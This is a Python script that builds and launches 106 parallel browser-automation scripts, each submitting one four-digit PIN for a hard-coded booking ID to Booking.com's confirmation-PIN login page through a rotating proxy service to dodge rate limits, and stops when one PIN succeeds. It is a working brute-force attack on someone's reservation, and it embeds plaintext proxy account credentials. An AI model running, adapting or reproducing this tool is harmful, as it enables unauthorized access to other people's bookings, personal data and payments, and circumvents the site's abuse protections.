#!/usr/bin/env python3
"""
🚀 INDEPENDENT AGENT SYSTEM - Real Hunt
Creates 106 independent agents, each with its own browser and PIN
All agents run in parallel for booking ID: 6160911170
"""

import os
import subprocess
import time
from datetime import datetime
from colorama import Fore, Style, init

init(autoreset=True)

# Configuration
REAL_BOOKING_ID = "6160911170"
TOTAL_AGENTS = 106

def create_agent_structure():
    """Create independent agent folders with their own scripts"""
    
    print(f"{Fore.CYAN}🏗️ Creating 106 independent agent structures...{Style.RESET_ALL}")
    
    # Generate all possible PINs (0000-9999)
    all_pins = [f"{i:04d}" for i in range(10000)]
    
    for agent_num in range(1, TOTAL_AGENTS + 1):
        agent_folder = f"agent_{agent_num:03d}"
        
        # Create agent folder
        os.makedirs(agent_folder, exist_ok=True)
        
        # Assign PIN to this agent
        pin = all_pins[agent_num - 1]  # 0000, 0001, 0002, etc.
        
        # Create agent's main.py
        agent_script = f"""#!/usr/bin/env python3
'''
🤖 INDEPENDENT AGENT #{agent_num:03d}
Booking ID: {REAL_BOOKING_ID}
Assigned PIN: {pin}
'''

from playwright.sync_api import sync_playwright
import os
import time
from datetime import datetime

# Agent Configuration
AGENT_ID = "AGENT_{agent_num:03d}"
BOOKING_ID = "{REAL_BOOKING_ID}"
ASSIGNED_PIN = "{pin}"
SCREENSHOTS_DIR = "screenshots"

# Proxy Configuration - Each agent gets unique proxy
PROXY_CONFIG = {{
    "server": "http://pr.oxylabs.io:7777",
    "username": "customer-1proxylabs_atNPR-cc-us",
    "password": "1proxylabs_atNPR1"
}}

def log_message(message):
    '''Log agent activity'''
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    log_entry = f"[{{timestamp}}] {{AGENT_ID}}: {{message}}"
    print(log_entry)
    
    # Write to agent's log file
    with open("agent_log.txt", "a", encoding="utf-8") as f:
        f.write(log_entry + "\\n")

def test_pin():
    '''Main PIN testing function'''
    os.makedirs(SCREENSHOTS_DIR, exist_ok=True)
    
    log_message(f"🚀 Starting mission - Testing PIN {{ASSIGNED_PIN}} for booking {{BOOKING_ID}}")
    
    try:
        with sync_playwright() as p:
            # Launch browser with proxy
            log_message("🌐 Launching browser with proxy...")
            browser = p.chromium.launch(
                headless=True,  # Run in background
                proxy=PROXY_CONFIG
            )
            page = browser.new_page()
            
            # Navigate to booking page
            log_message("🔄 Navigating to booking confirmation page...")
            page.goto("https://secure.booking.com/help/confirmation_pin_auth", 
                     wait_until="load", 
                     timeout=30000)
            
            # Wait for form to load
            log_message("⏳ Waiting for form elements to load...")
            page.wait_for_selector('input[placeholder="e.g. 1234567890"]', timeout=15000)
            
            # Fill booking ID
            log_message(f"📝 Filling booking ID: {{BOOKING_ID}}")
            page.fill('input[placeholder="e.g. 1234567890"]', BOOKING_ID)
            
            # Fill PIN
            log_message(f"🔑 Filling PIN: {{ASSIGNED_PIN}}")
            page.fill('input[placeholder="e.g. 1234"]', ASSIGNED_PIN)
            
            # Submit form
            log_message("🚀 Submitting form...")
            try:
                page.wait_for_selector('button:has-text("Continue")', timeout=5000)
                page.click('button:has-text("Continue")')
            except Exception:
                page.wait_for_selector('button[type="submit"]', timeout=5000)
                page.click('button[type="submit"]')
            
            # Wait for result
            log_message("⏳ Waiting for result...")
            page.wait_for_function(
                '''
                () => {{
                    return location.href.includes('unique_order_id') ||
                           document.querySelector('.bui-alert--error') !== null
                }}
                ''',
                timeout=30000
            )
            
            current_url = page.url
            
            # Check result
            if "unique_order_id=" in current_url:
                # SUCCESS!
                log_message(f"🎉 SUCCESS! PIN {{ASSIGNED_PIN}} is CORRECT!")
                log_message(f"🔗 Success URL: {{current_url}}")
                
                # Take success screenshot
                page.screenshot(path=f"{{SCREENSHOTS_DIR}}/SUCCESS_{{BOOKING_ID}}_{{ASSIGNED_PIN}}.png")
                
                # Write success file
                with open("../SUCCESS_FOUND.txt", "w") as f:
                    f.write(f"SUCCESS|{{AGENT_ID}}|{{ASSIGNED_PIN}}|{{current_url}}|{{datetime.now()}}")
                
                log_message("🏆 MISSION ACCOMPLISHED! Success file created.")
                browser.close()
                return True
                
            elif page.query_selector('.bui-alert--error'):
                # Failed
                log_message(f"❌ PIN {{ASSIGNED_PIN}} is incorrect")
                page.screenshot(path=f"{{SCREENSHOTS_DIR}}/FAIL_{{BOOKING_ID}}_{{ASSIGNED_PIN}}.png")
                browser.close()
                return False
                
            else:
                # Unknown result
                log_message(f"❓ Unknown result for PIN {{ASSIGNED_PIN}}")
                page.screenshot(path=f"{{SCREENSHOTS_DIR}}/UNKNOWN_{{BOOKING_ID}}_{{ASSIGNED_PIN}}.png")
                browser.close()
                return False
                
    except Exception as e:
        log_message(f"💥 Error during PIN test: {{str(e)}}")
        return False

if __name__ == "__main__":
    log_message("🤖 Agent initialized and ready for mission")
    success = test_pin()
    
    if success:
        log_message("✅ MISSION SUCCESS - PIN FOUND!")
    else:
        log_message("❌ Mission failed - PIN incorrect")
    
    log_message("🏠 Agent mission complete - returning home")
"""

        # Write agent script
        with open(f"{agent_folder}/main.py", "w", encoding="utf-8") as f:
            f.write(agent_script)
        
        print(f"{Fore.GREEN}✅ Agent {agent_num:03d} created - PIN: {pin}{Style.RESET_ALL}")
    
    print(f"{Fore.GREEN}🎯 All 106 agents created successfully!{Style.RESET_ALL}")

def launch_all_agents():
    """Launch all 106 agents simultaneously"""
    
    print(f"\n{Fore.RED}{Style.BRIGHT}🚀 LAUNCHING 106 INDEPENDENT AGENTS...{Style.RESET_ALL}")
    
    processes = []
    start_time = time.time()
    
    # Launch all agents
    for agent_num in range(1, TOTAL_AGENTS + 1):
        agent_folder = f"agent_{agent_num:03d}"
        
        try:
            # Launch agent in its own folder
            process = subprocess.Popen(
                ["python", "main.py"],
                cwd=agent_folder,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            processes.append((process, agent_num))
            print(f"{Fore.GREEN}🚀 Agent {agent_num:03d} launched{Style.RESET_ALL}")
            
        except Exception as e:
            print(f"{Fore.RED}❌ Failed to launch agent {agent_num:03d}: {e}{Style.RESET_ALL}")
    
    print(f"\n{Fore.CYAN}✅ All agents launched! Monitoring for success...{Style.RESET_ALL}")
    
    # Monitor for success
    success_found = False
    while not success_found:
        # Check for success file
        if os.path.exists("SUCCESS_FOUND.txt"):
            success_found = True
            break
        
        # Check if any processes finished
        for process, agent_num in processes:
            if process.poll() is not None:
                print(f"{Fore.BLUE}Agent {agent_num:03d} completed{Style.RESET_ALL}")
        
        time.sleep(2)  # Check every 2 seconds
    
    # Success found - kill all remaining processes
    if success_found:
        print(f"\n{Fore.GREEN}{Style.BRIGHT}🎉 SUCCESS DETECTED! Stopping all agents...{Style.RESET_ALL}")
        
        for process, agent_num in processes:
            if process.poll() is None:
                process.terminate()
        
        # Read success details
        try:
            with open("SUCCESS_FOUND.txt", "r") as f:
                success_data = f.read().strip().split("|")
                winning_agent = success_data[1]
                winning_pin = success_data[2]
                success_url = success_data[3]
                timestamp = success_data[4]
            
            victory_banner = f'''
{Fore.GREEN}{Style.BRIGHT}
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║                  🎉 INDEPENDENT AGENTS VICTORY! 🎉                          ║
║                                                                              ║
║  Booking ID: {REAL_BOOKING_ID}                                               ║
║  Winning PIN: {winning_pin}                                                  ║
║  Victorious Agent: {winning_agent}                                           ║
║  Success Time: {timestamp.split()[1]}                                        ║
║  Total Agents: {TOTAL_AGENTS}                                                ║
║                                                                              ║
║                    🏆 MISSION ACCOMPLISHED! 🏆                              ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}
'''
            print(victory_banner)
            
        except Exception as e:
            print(f"{Fore.RED}Error reading success file: {e}{Style.RESET_ALL}")
    
    end_time = time.time()
    total_time = end_time - start_time
    
    print(f"\n{Fore.CYAN}📊 MISSION STATISTICS:")
    print(f"• Total time: {total_time:.1f} seconds")
    print(f"• Agents deployed: {TOTAL_AGENTS}")
    print(f"• Each agent had unique proxy IP")
    print(f"• Each agent tested 1 PIN independently{Style.RESET_ALL}")

def main():
    """Main function"""
    banner = f'''
{Fore.CYAN}{Style.BRIGHT}
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║                🤖 INDEPENDENT AGENT ARMY SYSTEM 🤖                          ║
║                                                                              ║
║  Target: Booking ID {REAL_BOOKING_ID}                                        ║
║  Strategy: 106 completely independent agents                                ║
║  Each agent: Own browser + Own PIN + Own proxy IP                           ║
║  Execution: Full parallel processing                                        ║
║                                                                              ║
║                     🚀 READY FOR DEPLOYMENT! 🚀                             ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}
'''
    print(banner)
    
    print(f"{Fore.YELLOW}🎯 DEPLOYMENT PLAN:")
    print(f"1. Create 106 independent agent folders")
    print(f"2. Each agent gets unique PIN (0000-0105)")
    print(f"3. Each agent runs in parallel with own browser")
    print(f"4. Each agent uses different proxy IP")
    print(f"5. First agent to succeed stops all others")
    print()
    
    # Create agent structure
    create_agent_structure()
    
    input(f"\\n{Fore.GREEN}Press ENTER to launch all 106 agents...{Style.RESET_ALL}")
    
    # Launch all agents
    launch_all_agents()

if __name__ == "__main__":
    main()
